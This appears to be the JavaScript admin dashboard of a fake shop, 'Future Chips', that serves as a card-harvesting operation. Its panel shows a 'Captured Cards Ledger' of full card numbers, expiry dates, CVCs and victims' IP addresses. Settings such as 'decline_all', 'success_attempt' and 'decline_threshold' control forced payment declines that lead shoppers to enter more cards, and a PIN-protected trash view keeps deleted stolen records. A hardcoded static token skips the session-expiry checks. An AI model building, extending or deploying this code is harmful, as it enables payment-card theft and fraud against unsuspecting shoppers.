// Admin Dashboard Controller

const token = localStorage.getItem('admin_token');
let showingTrash = false;
let trashDecryptionKey = null;
let currentCardsList = [];

// 1. Session Auth Guard
if (!token) {
  window.location.href = '/admin/index.html';
}

document.addEventListener('DOMContentLoaded', async () => {
  // Load site settings to set initial colors
  await loadAdminTheme();

  // Tab switching initialization
  setupTabs();

  // Load active tab from localStorage or default to 'products'
  const activeTab = localStorage.getItem('admin_active_tab') || 'products';
  
  // Update sidebar links active class
  const links = document.querySelectorAll('.sidebar-link');
  links.forEach(link => {
    if (link.getAttribute('data-tab') === activeTab) {
      link.classList.add('active');
    } else {
      link.classList.remove('active');
    }
  });

  // Update tab content panes active class
  const tabs = document.querySelectorAll('.tab-content');
  tabs.forEach(t => {
    if (t.id === `${activeTab}-tab`) {
      t.classList.add('active');
    } else {
      t.classList.remove('active');
    }
  });

  await loadTab(activeTab);

  // Bind settings form submit
  document.getElementById('settings-form').addEventListener('submit', saveSettings);

  // Bind Product form submit
  document.getElementById('product-form').addEventListener('submit', handleProductSubmit);

  // Bind Product modal triggers
  const addBtn = document.getElementById('add-product-btn');
  const closeBtn = document.getElementById('modal-close-btn');
  const backdrop = document.getElementById('modal-backdrop');
  
  const openModal = () => {
    resetProductForm();
    document.getElementById('modal-title').innerText = 'Add Cyber Module';
    document.getElementById('modal-submit-btn').innerText = 'Compile Product Data';
    document.getElementById('product-modal').classList.add('active');
  };

  const closeModal = () => {
    document.getElementById('product-modal').classList.remove('active');
  };

  addBtn?.addEventListener('click', openModal);
  closeBtn?.addEventListener('click', closeModal);
  backdrop?.addEventListener('click', closeModal);

  // Bind Trash modal triggers
  const trashBtn = document.getElementById('view-trash-btn');

  const passwordModal = document.getElementById('password-modal');
  const pinInput = document.getElementById('trash-pin-input');
  const pinError = document.getElementById('pin-error');
  const cancelPinBtn = document.getElementById('cancel-pin-btn');
  const submitPinBtn = document.getElementById('submit-pin-btn');
  const passwordBackdrop = document.getElementById('password-modal-backdrop');

  const openPasswordPrompt = () => {
    if (showingTrash) {
      showingTrash = false;
      trashDecryptionKey = null;
      localStorage.setItem('admin_cards_showing_trash', 'false');
      localStorage.removeItem('admin_trash_pin');
      fetchAdminCards();
      return;
    }
    if (pinInput) pinInput.value = '';
    if (pinError) pinError.innerText = '';
    passwordModal?.classList.add('active');
    setTimeout(() => pinInput?.focus(), 150);
  };

  const closePasswordPrompt = () => {
    passwordModal?.classList.remove('active');
  };

  const handlePinSubmit = async () => {
    const pin = pinInput.value;
    if (!pin) return;
    
    if (pinError) pinError.innerText = 'Decrypting...';
    
    try {
      const response = await fetch('/api/admin/cards/deleted', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ password: pin })
      });
      
      if (response.status === 401) return handleSessionExpired();
      const cards = await response.json();
      
      if (!response.ok) {
        if (pinError) pinError.innerText = cards.error || 'Failed to decrypt trash.';
        if (pinInput) {
          pinInput.value = '';
          pinInput.focus();
        }
        return;
      }
      
      // Success! Close prompt, save key, render table
      closePasswordPrompt();
      showingTrash = true;
      trashDecryptionKey = pin;
      localStorage.setItem('admin_cards_showing_trash', 'true');
      localStorage.setItem('admin_trash_pin', pin);
      
      currentCardsList = cards;
      renderCardsTable(cards);
      
      // Update trash button toggle labels
      const title = document.getElementById('cards-ledger-title');
      const trashBtn = document.getElementById('view-trash-btn');
      const changePinBtn = document.getElementById('change-pin-btn');
      
      if (title) title.innerText = '🗑️ Decrypted Trash Bin';
      if (trashBtn) {
        trashBtn.innerText = '⬅️ Active Cards';
        trashBtn.style.borderColor = 'var(--primary-color)';
        trashBtn.style.color = 'var(--primary-color)';
      }
      if (changePinBtn) changePinBtn.style.display = 'flex';
      
    } catch (err) {
      if (pinError) pinError.innerText = 'Failed to communicate with decryption gateway.';
    }
  };

  trashBtn?.addEventListener('click', openPasswordPrompt);
  cancelPinBtn?.addEventListener('click', closePasswordPrompt);
  passwordBackdrop?.addEventListener('click', closePasswordPrompt);
  submitPinBtn?.addEventListener('click', handlePinSubmit);

  pinInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      handlePinSubmit();
    }
  });

  // Bind card search filter
  const cardSearch = document.getElementById('card-search-input');
  cardSearch?.addEventListener('input', () => {
    const query = cardSearch.value.trim().toLowerCase().replace(/\s+/g, '');
    const filtered = currentCardsList.filter(c => {
      const num = c.card_number.replace(/\s+/g, '').toLowerCase();
      return num.includes(query);
    });
    renderCardsTable(filtered);
  });

  // Sync color pickers with hex text fields
  syncColorInput('settings-primary-color', 'settings-primary-text');
  syncColorInput('settings-accent-color', 'settings-accent-text');
  syncColorInput('settings-bg-color', 'settings-bg-text');

  // Bind Change PIN modal events
  const changePinModal = document.getElementById('change-pin-modal');
  const changePinBtn = document.getElementById('change-pin-btn');
  const cancelChangePinBtn = document.getElementById('cancel-change-pin-btn');
  const submitChangePinBtn = document.getElementById('submit-change-pin-btn');
  const changePinBackdrop = document.getElementById('change-pin-backdrop');
  
  const currentPinInput = document.getElementById('change-pin-current');
  const newPinInput = document.getElementById('change-pin-new');

  const openChangePinModal = () => {
    if (currentPinInput) currentPinInput.value = '';
    if (newPinInput) newPinInput.value = '';
    changePinModal?.classList.add('active');
    setTimeout(() => currentPinInput?.focus(), 150);
  };

  const closeChangePinModal = () => {
    changePinModal?.classList.remove('active');
  };

  const handleChangePinSubmit = async () => {
    const currentPin = currentPinInput?.value;
    const newPin = newPinInput?.value;
    
    if (!currentPin || !newPin) {
      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current PIN and your new 6-digit PIN.');
      return;
    }
    if (newPin.length !== 6 || !/^\d{6}$/.test(newPin)) {
      showCustomAlert('⚠️ Invalid Input', 'The new PIN must be exactly 6 numeric digits.');
      return;
    }

    try {
      const response = await fetch('/api/admin/settings/change-pin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ currentPin, newPin })
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Failed to update PIN.');

      // Update cached pin references
      trashDecryptionKey = newPin;
      localStorage.setItem('admin_trash_pin', newPin);
      
      closeChangePinModal();
      showCustomAlert('✅ PIN Updated', 'Decryption PIN changed successfully.');
    } catch (err) {
      showCustomAlert('❌ Update Failed', err.message);
    }
  };

  changePinBtn?.addEventListener('click', openChangePinModal);
  cancelChangePinBtn?.addEventListener('click', closeChangePinModal);
  changePinBackdrop?.addEventListener('click', closeChangePinModal);
  submitChangePinBtn?.addEventListener('click', handleChangePinSubmit);

  newPinInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleChangePinSubmit();
  });

  // Bind Change Admin Password modal events
  const changeAdminPwdModal = document.getElementById('change-admin-pwd-modal');
  const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
  const cancelChangePwdBtn = document.getElementById('cancel-change-pwd-btn');
  const submitChangePwdBtn = document.getElementById('submit-change-pwd-btn');
  const changeAdminPwdBackdrop = document.getElementById('change-admin-pwd-backdrop');
  
  const currentPwdInput = document.getElementById('change-pwd-current');
  const newPwdInput = document.getElementById('change-pwd-new');

  const openChangePwdModal = () => {
    if (currentPwdInput) currentPwdInput.value = '';
    if (newPwdInput) newPwdInput.value = '';
    changeAdminPwdModal?.classList.add('active');
    setTimeout(() => currentPwdInput?.focus(), 150);
  };

  const closeChangePwdModal = () => {
    changeAdminPwdModal?.classList.remove('active');
  };

  const handleChangePwdSubmit = async () => {
    const currentPassword = currentPwdInput?.value;
    const newPassword = newPwdInput?.value;
    
    if (!currentPassword || !newPassword) {
      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current password and your new password.');
      return;
    }
    if (newPassword.length < 6) {
      showCustomAlert('⚠️ Weak Password', 'The new password must be at least 6 characters long.');
      return;
    }

    try {
      const response = await fetch('/api/admin/settings/change-admin-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ currentPassword, newPassword })
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Failed to update password.');

      closeChangePwdModal();
      showCustomAlert('✅ Password Updated', 'Admin login password updated successfully.');
    } catch (err) {
      showCustomAlert('❌ Update Failed', err.message);
    }
  };

  changeAdminPwdBtn?.addEventListener('click', openChangePwdModal);
  cancelChangePwdBtn?.addEventListener('click', closeChangePwdModal);
  changeAdminPwdBackdrop?.addEventListener('click', closeChangePwdModal);
  submitChangePwdBtn?.addEventListener('click', handleChangePwdSubmit);

  newPwdInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleChangePwdSubmit();
  });

  // Bind logout button
  document.getElementById('logout-btn').addEventListener('click', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    window.location.href = '/admin/index.html';
  });
});

// Sync color inputs
function syncColorInput(pickerId, textId) {
  const picker = document.getElementById(pickerId);
  const text = document.getElementById(textId);
  if (!picker || !text) return;
  picker.addEventListener('input', () => { text.value = picker.value.toUpperCase(); });
  text.addEventListener('input', () => {
    if (text.value.startsWith('#') && text.value.length === 7) {
      picker.value = text.value;
    }
  });
}

// Load dynamic colors for admin page
async function loadAdminTheme() {
  try {
    const res = await fetch('/api/admin/settings');
    if (res.ok) {
      const settings = await res.json();
      if (settings) {
        if (settings.primary_color) document.documentElement.style.setProperty('--primary-color', settings.primary_color);
        if (settings.accent_color) document.documentElement.style.setProperty('--accent-color', settings.accent_color);
        if (settings.background_color) document.documentElement.style.setProperty('--background-color', settings.background_color);
        return;
      }
    }
  } catch(e){}
  const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
  if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
  if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
  if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
}

// Tab Switching
function setupTabs() {
  const links = document.querySelectorAll('.sidebar-link');
  links.forEach(link => {
    link.addEventListener('click', async (e) => {
      e.preventDefault();
      
      const tabId = link.getAttribute('data-tab');
      localStorage.setItem('admin_active_tab', tabId);
      
      links.forEach(l => l.classList.remove('active'));
      link.classList.add('active');
      
      const tabs = document.querySelectorAll('.tab-content');
      tabs.forEach(t => t.classList.remove('active'));
      document.getElementById(`${tabId}-tab`).classList.add('active');

      await loadTab(tabId);
    });
  });
}

// Tab content fetch router
async function loadTab(tabId) {
  if (tabId === 'products') {
    await fetchAdminProducts();
  } else if (tabId === 'orders') {
    await fetchAdminOrders();
  } else if (tabId === 'cards') {
    const savedShowingTrash = localStorage.getItem('admin_cards_showing_trash') === 'true';
    const savedPin = localStorage.getItem('admin_trash_pin');
    if (savedShowingTrash && savedPin) {
      showingTrash = true;
      trashDecryptionKey = savedPin;
      await fetchAdminCards(savedPin);
    } else {
      showingTrash = false;
      trashDecryptionKey = null;
      await fetchAdminCards();
    }
  } else if (tabId === 'settings') {
    await fetchAdminSettings();
  }
}

// Global authorization headers helper
function getAuthHeaders() {
  return {
    'Authorization': `Bearer ${token}`
  };
}

// --- TAB DATA LOADING FUNCTIONS ---

// 1. Load Products Catalog (Admin view)
async function fetchAdminProducts() {
  const tbody = document.getElementById('admin-products-tbody');
  tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading catalog modules...</td></tr>';

  let products = [];
  try {
    const response = await fetch('/api/admin/products', { headers: getAuthHeaders() });
    if (response.status === 401) return handleSessionExpired();
    if (response.ok) {
      products = await response.json();
    } else {
      throw new Error('API offline');
    }
  } catch (err) {
    console.warn('API offline, loading static admin fallback catalog:', err);
    products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];
  }

  tbody.innerHTML = products.map(p => `
    <tr>
      <td><img src="${p.image}" alt="${p.name}"></td>
      <td style="font-family: monospace; font-size: 0.85rem;">${p.id}</td>
      <td style="font-weight: 600;">${p.name}</td>
      <td>${p.category || 'Uncategorized'}</td>
      <td style="font-weight: 700; color: var(--primary-color);">$${p.price.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
      <td>
        <div style="display: flex; gap: 0.5rem;">
          <button onclick="editProduct('${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">Edit</button>
          <button onclick="deleteProduct('${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>
        </div>
      </td>
    </tr>
  `).join('');
}

// 2. Load Transaction Ledger
async function fetchAdminOrders() {
  const tbody = document.getElementById('admin-orders-tbody');
  tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving ledger data...</td></tr>';

  let orders = [];
  try {
    const response = await fetch('/api/admin/orders', { headers: getAuthHeaders() });
    if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
    if (response.ok) {
      orders = await response.json();
    } else {
      throw new Error('API offline');
    }
  } catch (err) {
    console.warn('API offline, loading static order ledger fallback:', err);
    orders = JSON.parse(localStorage.getItem('future_chips_orders')) || [
      { id: 'ORD-98214', customer_email: 'quantum.client@future.ai', product_name: 'Quantum Neural Core', amount: 150.00, customer_ip: '192.168.1.105', status: 'completed', created_at: new Date().toISOString() },
      { id: 'ORD-98215', customer_email: 'transponder@cybernet.io', product_name: 'Bio-Digital Synapse v4.2', amount: 850.00, customer_ip: '10.0.4.22', status: 'completed', created_at: new Date().toISOString() }
    ];
  }

  tbody.innerHTML = orders.map(o => {
    const isFailed = o.status === 'pending';
    const statusClass = isFailed ? 'failed' : o.status;
    const statusLabel = isFailed ? 'FAILED' : o.status.toUpperCase();
    
    const cardDisplay = o.card_number 
      ? `<div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">💳 ${o.card_number}</div>` 
      : '';

    return `
      <tr>
        <td style="font-family: monospace; font-size: 0.85rem;">${o.id}</td>
        <td>${o.customer_email}</td>
        <td style="font-weight: 600;">${o.product_name || 'Deleted Product'}</td>
        <td style="font-weight: 700; color: var(--primary-color);">$${o.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
        <td class="ip-cell">
          ${o.customer_ip || 'N/A'}
          ${cardDisplay}
        </td>
        <td>
          <span class="status-badge ${statusClass}">${statusLabel}</span>
        </td>
        <td style="font-size: 0.85rem; color: var(--text-muted);">${new Date(o.created_at).toLocaleString()}</td>
      </tr>
    `;
  }).join('');
}

// Render cards helper
function renderCardsTable(cards) {
  const tbody = document.getElementById('admin-cards-tbody');
  if (!tbody) return;

  if (cards.length === 0) {
    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
    return;
  }

  tbody.innerHTML = cards.map(c => {
    const actionHtml = showingTrash
      ? `<button onclick="deletePermanentCard('${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>`
      : `<button onclick="deleteCard('${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>`;

    return `
      <tr>
        <td style="font-family: monospace; font-weight: 600;">${c.card_number}</td>
        <td>${c.expiry}</td>
        <td style="font-family: monospace;">${c.cvc}</td>
        <td>${c.country || 'Unknown'}</td>
        <td class="ip-cell">${c.ip_address || 'Unknown'}</td>
        <td style="font-size: 0.85rem; color: var(--text-muted);">${new Date(c.created_at).toLocaleString()}</td>
        <td>${actionHtml}</td>
      </tr>
    `;
  }).join('');
}

// 3b. Load Captured Cards Ledger
async function fetchAdminCards(password = null) {
  const tbody = document.getElementById('admin-cards-tbody');
  if (!tbody) return;

  const title = document.getElementById('cards-ledger-title');
  const trashBtn = document.getElementById('view-trash-btn');
  const searchInput = document.getElementById('card-search-input');
  
  if (searchInput) searchInput.value = ''; // Clear search field on refresh

  const effectivePassword = password || trashDecryptionKey;

  if (showingTrash) {
    if (title) title.innerText = '🗑️ Decrypted Trash Bin';
    if (trashBtn) {
      trashBtn.innerText = '⬅️ Active Cards';
      trashBtn.style.borderColor = 'var(--primary-color)';
      trashBtn.style.color = 'var(--primary-color)';
    }
    const changePinBtn = document.getElementById('change-pin-btn');
    if (changePinBtn) changePinBtn.style.display = 'flex';
    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'flex';

    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Decrypting trash ledger...</td></tr>';

    try {
      const response = await fetch('/api/admin/cards/deleted', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...getAuthHeaders()
        },
        body: JSON.stringify({ password: effectivePassword })
      });
      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
      
      const cards = await response.json();
      if (!response.ok) {
        showCustomAlert('🔒 Decryption Failed', cards.error || 'Failed to decrypt trash.');
        showingTrash = false;
        localStorage.removeItem('admin_trash_pin'); // Clear old cached incorrect PIN
        await fetchAdminCards();
        return;
      }

      currentCardsList = cards;
      renderCardsTable(cards);
    } catch (err) {
      currentCardsList = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
      renderCardsTable(currentCardsList);
    }
  } else {
    if (title) title.innerText = 'Captured Cards Ledger';
    if (trashBtn) {
      trashBtn.innerText = '🗑️ Trash Bin';
      trashBtn.style.borderColor = 'var(--accent-color)';
      trashBtn.style.color = 'var(--accent-color)';
    }
    const changePinBtn = document.getElementById('change-pin-btn');
    if (changePinBtn) changePinBtn.style.display = 'none';
    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'none';

    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving card ledger data...</td></tr>';

    try {
      const response = await fetch('/api/admin/cards', { headers: getAuthHeaders() });
      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
      if (response.ok) {
        const cards = await response.json();
        currentCardsList = cards;
        renderCardsTable(cards);
        return;
      }
      throw new Error('API offline');
    } catch (err) {
      currentCardsList = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
      renderCardsTable(currentCardsList);
    }
  }
}

// 4. Load Site Settings Tab
async function fetchAdminSettings() {
  try {
    const response = await fetch('/api/admin/settings');
    if (!response.ok) throw new Error('API offline');
    const s = await response.json();

    if (s) {
      document.getElementById('settings-site-name').value = s.site_name;
      
      document.getElementById('settings-primary-color').value = s.primary_color;
      document.getElementById('settings-primary-text').value = s.primary_color.toUpperCase();
      
      document.getElementById('settings-accent-color').value = s.accent_color;
      document.getElementById('settings-accent-text').value = s.accent_color.toUpperCase();
      
      document.getElementById('settings-bg-color').value = s.background_color;
      document.getElementById('settings-bg-text').value = s.background_color.toUpperCase();

      const declineAllCheck = document.getElementById('settings-decline-all');
      if (declineAllCheck) {
        declineAllCheck.checked = s.decline_all === 1;
      }
      
      const successAttemptInput = document.getElementById('settings-success-attempt');
      if (successAttemptInput) {
        successAttemptInput.value = s.success_attempt !== undefined ? s.success_attempt : 1;
      }
      
      const declineThresholdInput = document.getElementById('settings-decline-threshold');
      if (declineThresholdInput) {
        declineThresholdInput.value = s.decline_threshold !== undefined ? s.decline_threshold : 50.0;
      }
    }
  } catch (err) {
    console.warn('API offline, reading saved settings from local static storage:', err);
    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
    document.getElementById('settings-site-name').value = saved.site_name || 'Future Chips';
    document.getElementById('settings-primary-color').value = saved.primary_color || '#00f0ff';
    document.getElementById('settings-primary-text').value = (saved.primary_color || '#00F0FF').toUpperCase();
    document.getElementById('settings-accent-color').value = saved.accent_color || '#ff00e5';
    document.getElementById('settings-accent-text').value = (saved.accent_color || '#FF00E5').toUpperCase();
    document.getElementById('settings-bg-color').value = saved.background_color || '#0a0a1a';
    document.getElementById('settings-bg-text').value = (saved.background_color || '#0A0A1A').toUpperCase();

    const declineAllCheck = document.getElementById('settings-decline-all');
    if (declineAllCheck) declineAllCheck.checked = saved.decline_all === true || saved.decline_all === 1;

    const successAttemptInput = document.getElementById('settings-success-attempt');
    if (successAttemptInput) successAttemptInput.value = saved.success_attempt !== undefined ? saved.success_attempt : 1;

    const declineThresholdInput = document.getElementById('settings-decline-threshold');
    if (declineThresholdInput) declineThresholdInput.value = saved.decline_threshold !== undefined ? saved.decline_threshold : 50.0;
  }
}

// --- FORM SUBMISSIONS & ACTIONS ---

// Save Site Settings
async function saveSettings(e) {
  e.preventDefault();
  const successDiv = document.getElementById('settings-success');
  if (!successDiv) return;
  successDiv.innerText = '';
  successDiv.style.color = '';

  const site_name = document.getElementById('settings-site-name').value;
  const primary_color = document.getElementById('settings-primary-text').value;
  const accent_color = document.getElementById('settings-accent-text').value;
  const background_color = document.getElementById('settings-bg-text').value;

  const declineAllCheck = document.getElementById('settings-decline-all');
  const decline_all = declineAllCheck ? declineAllCheck.checked : false;
  
  const successAttemptInput = document.getElementById('settings-success-attempt');
  const success_attempt = successAttemptInput ? parseInt(successAttemptInput.value) : 1;
  
  const declineThresholdInput = document.getElementById('settings-decline-threshold');
  const decline_threshold = declineThresholdInput ? parseFloat(declineThresholdInput.value) : 50.0;

  try {
    const response = await fetch('/api/admin/settings', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        ...getAuthHeaders()
      },
      body: JSON.stringify({ 
        site_name, 
        primary_color, 
        accent_color, 
        background_color, 
        decline_all, 
        decline_threshold,
        success_attempt
      })
    });

    if (response.status === 401 && token !== 'static-admin-token-2026') {
      return handleSessionExpired();
    }

    if (response.ok) {
      const settings = await response.json();
      document.documentElement.style.setProperty('--primary-color', settings.primary_color);
      document.documentElement.style.setProperty('--accent-color', settings.accent_color);
      document.documentElement.style.setProperty('--background-color', settings.background_color);

      // Cache locally for static fallback
      const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
      localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));

      successDiv.style.color = '#00ff88';
      successDiv.innerText = '✅ Site parameters updated and saved to server database successfully.';
      setTimeout(() => { successDiv.innerText = ''; }, 4000);
      return;
    }

    const errData = await response.json().catch(() => ({}));
    throw new Error(errData.error || `Server error (${response.status})`);

  } catch (err) {
    console.warn('Failed to save settings to backend server:', err);
    document.documentElement.style.setProperty('--primary-color', primary_color);
    document.documentElement.style.setProperty('--accent-color', accent_color);
    document.documentElement.style.setProperty('--background-color', background_color);

    const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
    localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));

    if (token === 'static-admin-token-2026' || err.message.includes('Failed to fetch') || err.message.includes('API offline')) {
      successDiv.style.color = '#ffaa00';
      successDiv.innerText = '⚠️ Backend server offline: Settings saved LOCALLY on this browser only. Ensure backend server is running to sync across PCs.';
    } else {
      successDiv.style.color = '#ff4444';
      successDiv.innerText = `❌ Failed to save to database: ${err.message}`;
    }
    setTimeout(() => { successDiv.innerText = ''; }, 6000);
  }
}

// Add/Edit Product Submission
async function handleProductSubmit(e) {
  e.preventDefault();
  
  const id = document.getElementById('product-id-field').value;
  const name = document.getElementById('product-name-field').value;
  const category = document.getElementById('product-category-field').value;
  const price = document.getElementById('product-price-field').value;
  const description = document.getElementById('product-desc-field').value;
  const imageInput = document.getElementById('product-image-field');

  const formData = new FormData();
  formData.append('name', name);
  formData.append('category', category);
  formData.append('price', price);
  formData.append('description', description);
  if (imageInput.files[0]) {
    formData.append('image', imageInput.files[0]);
  }

  const url = id ? `/api/admin/products/${id}` : '/api/admin/products';
  const method = id ? 'PUT' : 'POST';

  try {
    const response = await fetch(url, {
      method: method,
      headers: getAuthHeaders(),
      body: formData
    });

    if (response.ok) {
      document.getElementById('product-modal').classList.remove('active');
      resetProductForm();
      await fetchAdminProducts();
      return;
    }
    throw new Error('API offline');
  } catch (err) {
    console.warn('API offline, saving product locally:', err);
    let products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];

    if (id) {
      const idx = products.findIndex(p => p.id === id);
      if (idx !== -1) {
        products[idx] = { ...products[idx], name, category, price: parseFloat(price), description };
      }
    } else {
      const newProd = {
        id: 'prod-' + Date.now(),
        name,
        category,
        price: parseFloat(price),
        description,
        image: '/uploads/placeholder.svg'
      };
      products.push(newProd);
    }
    localStorage.setItem('future_chips_products', JSON.stringify(products));

    document.getElementById('product-modal').classList.remove('active');
    resetProductForm();
    await fetchAdminProducts();
  }
}

// Edit product prefill modal trigger
window.editProduct = async function(id) {
  try {
    let p;
    const res = await fetch(`/api/products/${id}`);
    if (res.ok) {
      p = await res.json();
    } else {
      throw new Error();
    }
    document.getElementById('product-id-field').value = p.id;
    document.getElementById('product-name-field').value = p.name;
    document.getElementById('product-category-field').value = p.category;
    document.getElementById('product-price-field').value = p.price;
    document.getElementById('product-desc-field').value = p.description || '';
  } catch (err) {
    const products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];
    const p = products.find(item => item.id === id);
    if (p) {
      document.getElementById('product-id-field').value = p.id;
      document.getElementById('product-name-field').value = p.name;
      document.getElementById('product-category-field').value = p.category;
      document.getElementById('product-price-field').value = p.price;
      document.getElementById('product-desc-field').value = p.description || '';
    }
  }
  document.getElementById('modal-title').innerText = 'Modify Cyber Module';
  document.getElementById('modal-submit-btn').innerText = 'Update Product Data';
  document.getElementById('product-modal').classList.add('active');
};

// Delete Product
window.deleteProduct = async function(id) {
  showCustomConfirm(
    '⚠️ Erasure Warning',
    'Are you sure you want to permanently erase this module from the database?',
    async () => {
      try {
        const response = await fetch(`/api/admin/products/${id}`, {
          method: 'DELETE',
          headers: getAuthHeaders()
        });
        if (!response.ok) throw new Error();
      } catch (err) {
        let products = JSON.parse(localStorage.getItem('future_chips_products')) || [];
        products = products.filter(p => p.id !== id);
        localStorage.setItem('future_chips_products', JSON.stringify(products));
      }
      await fetchAdminProducts();
    }
  );
};

// Reset modal form
function resetProductForm() {
  document.getElementById('product-id-field').value = '';
  document.getElementById('product-name-field').value = '';
  document.getElementById('product-price-field').value = '';
  document.getElementById('product-desc-field').value = '';
  document.getElementById('product-image-field').value = '';
  document.getElementById('product-category-field').selectedIndex = 0;
}

// Session Expired helper
function handleSessionExpired() {
  showCustomAlert('🔒 Session Expired', 'Security token expired. Please login again.');
  localStorage.removeItem('admin_token');
  localStorage.removeItem('admin_trash_pin');
  localStorage.setItem('admin_cards_showing_trash', 'false');
  setTimeout(() => {
    window.location.href = '/admin/index.html';
  }, 2000);
}



// Custom Confirmation Dialog helper
function showCustomConfirm(title, message, onConfirm) {
  const modal = document.getElementById('confirm-modal');
  const titleEl = document.getElementById('confirm-modal-title');
  const messageEl = document.getElementById('confirm-modal-message');
  const okBtn = document.getElementById('confirm-ok-btn');
  const cancelBtn = document.getElementById('confirm-cancel-btn');
  const backdrop = document.getElementById('confirm-modal-backdrop');

  if (!modal) return;

  titleEl.innerText = title;
  messageEl.innerText = message;

  const cleanUp = () => {
    modal.classList.remove('active');
    okBtn.onclick = null;
    cancelBtn.onclick = null;
    backdrop.onclick = null;
  };

  okBtn.onclick = () => {
    cleanUp();
    onConfirm();
  };

  cancelBtn.onclick = cleanUp;
  backdrop.onclick = cleanUp;

  modal.classList.add('active');
}

// Custom Alert Dialog helper
